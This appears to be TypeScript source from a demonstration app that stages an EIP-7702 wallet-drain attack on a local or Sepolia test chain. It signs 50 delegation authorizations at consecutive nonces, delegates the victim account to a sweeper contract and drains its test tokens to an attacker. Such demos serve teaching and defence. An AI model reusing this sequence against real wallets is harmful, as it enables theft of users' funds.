import { parseUnits, formatUnits, encodeFunctionData } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { publicClient, walletClient, getChain } from "./chain";
import { getConfig } from "./runtime";
import { ERC20_ABI, SWEEPER_ABI } from "./abi";
import type { Emit } from "./types";

const NUM_AUTHS = 50;
const DEC = 6;
const START_BALANCE = "2500000"; // minted to each fresh victim

// Real attack on anvil finishes in ~100ms — too fast to watch. Pace the stream so the
// sequence is presentable. The on-chain actions are unchanged; only the emit cadence is paced.
// Set ATTACK_PACE_MS=0 to disable (e.g. on Sepolia, where block times pace it naturally).
const PACE = Number(process.env.ATTACK_PACE_MS ?? 26);
const sleep = (ms: number) => (ms > 0 ? new Promise((r) => setTimeout(r, ms)) : Promise.resolve());

function env(k: string) {
  const v = process.env[k];
  if (!v) throw new Error(`Missing ${k} — run \`npm run setup\` (local) or configure .env (Sepolia).`);
  return v;
}

/**
 * The REAL Binance-style EIP-7702 attack. Executes on-chain against whatever
 * CHAIN_RPC/CHAIN_ID points at (local anvil by default, or Sepolia).
 *
 * Each run uses a FRESH victim (minted START_BALANCE tUSD) so the demo is
 * repeatable. The relayer pays gas and broadcasts; the attacker + contracts
 * come from `npm run setup` / deploy.
 */
export async function runAttack(emit: Emit) {
  const E = (e: Parameters<Emit>[0]) => emit({ t: Date.now(), ...e });

  const chain = getChain();
  const cfg = getConfig(); // current run's addresses (swapped by /api/reset)
  const relayer = privateKeyToAccount(env("RELAYER_PK") as `0x${string}`);
  const attacker = cfg.attacker;
  const sweeper = cfg.sweeper;
  const tusd = cfg.tusd;
  const victim = privateKeyToAccount(cfg.victimPk); // fixed victim (persistent on-chain balance)

  const pub = publicClient();
  const wallet = walletClient(relayer);

  E({ step: "setup", msg: "Actors loaded", victim: victim.address, relayer: relayer.address, attacker, sweeper, tusd });

  // Top the fixed victim up to START_BALANCE: mint only the shortfall, so the real
  // balance is exactly START_BALANCE before each run (no double-counting across reruns).
  const target = parseUnits(START_BALANCE, DEC);
  const cur0 = (await pub.readContract({ address: tusd, abi: ERC20_ABI, functionName: "balanceOf", args: [victim.address] })) as bigint;
  if (cur0 < target) {
    const mintHash = await wallet.writeContract({ address: tusd, abi: ERC20_ABI, functionName: "mint", args: [victim.address, target - cur0] });
    await pub.waitForTransactionReceipt({ hash: mintHash });
  }

  const before = (await pub.readContract({ address: tusd, abi: ERC20_ABI, functionName: "balanceOf", args: [victim.address] })) as bigint;
  E({ step: "before", msg: "Victim balance before attack", victimTUSD: formatUnits(before, DEC), attackerTUSD: "0" });

  // 1 — sign 50 authorizations at consecutive nonces
  const start = await pub.getTransactionCount({ address: victim.address });
  E({ step: "sign", msg: `Victim current nonce is ${start}. Signing ${NUM_AUTHS} authorizations at nonces ${start}..${start + NUM_AUTHS - 1}`, victimNonce: start, numAuths: NUM_AUTHS });
  const auths = [];
  for (let i = 0; i < NUM_AUTHS; i++) {
    auths.push(await victim.signAuthorization({ contractAddress: sweeper, chainId: chain.id, nonce: start + i }));
    E({ step: "sign-progress", msg: `Signed authorization ${i + 1}/${NUM_AUTHS}`, index: i + 1, nonce: start + i });
    await sleep(PACE);
  }
  E({ step: "sign-done", msg: `All ${NUM_AUTHS} authorizations signed. Exactly one (nonce ${start}) matches and takes effect.`, matchingNonce: start });
  await sleep(PACE * 14);

  // 2 — relayer broadcasts the delegation (victim nonce only advances via the authorization)
  E({ step: "delegate", msg: "Relayer broadcasting type-4 transaction carrying all 50 authorizations..." });
  const dHash = await wallet.sendTransaction({ authorizationList: auths, to: victim.address, data: "0x" });
  E({ step: "delegate-sent", msg: "Delegation tx sent", txHash: dHash });
  const dRc = await pub.waitForTransactionReceipt({ hash: dHash });
  E({ step: "delegate-mined", msg: "Delegation mined", block: Number(dRc.blockNumber), status: dRc.status });

  const code = await pub.getCode({ address: victim.address });
  const delegated = !!code && code.toLowerCase().startsWith("0xef0100");
  E({ step: "verify", msg: delegated ? "Victim account is now DELEGATED to the sweeper (0xef0100 marker present)" : "No delegation marker found", delegated, code });
  if (!delegated) { E({ step: "error", msg: "Delegation did not take effect (check CHAIN_ID / nonce / RPC supports type-4)." }); return; }
  await sleep(PACE * 14);

  // 3 — drain
  E({ step: "sweep", msg: "Calling sweeper to drain victim tUSD to attacker..." });
  const sData = encodeFunctionData({ abi: SWEEPER_ABI, functionName: "sweepToken", args: [tusd] });
  const sHash = await wallet.sendTransaction({ to: victim.address, data: sData });
  E({ step: "sweep-sent", msg: "Sweep tx sent", txHash: sHash });
  const sRc = await pub.waitForTransactionReceipt({ hash: sHash });
  E({ step: "sweep-mined", msg: "Sweep mined", block: Number(sRc.blockNumber), status: sRc.status });

  const after = (await pub.readContract({ address: tusd, abi: ERC20_ABI, functionName: "balanceOf", args: [victim.address] })) as bigint;
  const drained = before - after;
  E({ step: "after", msg: "Balances after attack", victimTUSD: formatUnits(after, DEC), attackerTUSD: formatUnits(drained, DEC), drained: formatUnits(drained, DEC) });
  E({ step: "done", msg: "Attack complete.", txHash: sHash });
}
